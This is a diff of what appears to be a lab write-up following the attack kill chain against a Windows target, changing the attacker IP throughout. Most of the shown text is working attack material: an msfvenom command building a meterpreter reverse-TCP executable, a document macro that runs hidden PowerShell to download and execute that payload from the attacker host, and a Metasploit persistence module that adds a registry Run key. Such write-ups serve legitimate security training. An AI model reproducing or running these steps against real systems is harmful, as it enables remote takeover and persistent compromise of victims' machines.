@@ -12,9 +12,9 @@ Weaponization
 
 We are going to use metasploit’s msfvenom to create a malicious payload: 
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > /var/www/html/shell.exe 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=4444 -f exe > /var/www/html/shell.exe 
 
--This will make sure the payload is accessible at http://192.168.1.10/shell.exe 
+-This will make sure the payload is accessible at http://192.168.1.12/shell.exe 
 
 Sudo service apache2 start 
 
@@ -35,7 +35,7 @@ Go to Tools > Macros > Edit Macro and input this:
 
     Set objShell = CreateObject("WScript.Shell") 
 
-    objShell.Run "powershell -w hidden -c ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.10/shell.exe', 'C:\\Windows\\Temp\\shell.exe'); Start-Process 'C:\\Windows\\Temp\\shell.exe'""" 
+    objShell.Run "powershell -w hidden -c ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.12/shell.exe', 'C:\\Windows\\Temp\\shell.exe'); Start-Process 'C:\\Windows\\Temp\\shell.exe'""" 
 
 End Sub” 
 
@@ -73,4 +73,6 @@ Attacks on Objective
 
 Employs persistence mechanisms using registry modifications and bootup folder, and exfiltrate data on windows AD server 
 
- 
+run exploit/windows/local/persistence LHOST=192.168.1.12 
+
+	-This created persistent VBS script on temp folder and installed autorun on the HKCU\SOftware\Microsoft\Windows\CurrentVersion\Run\qPmZVXCgSxDEj  
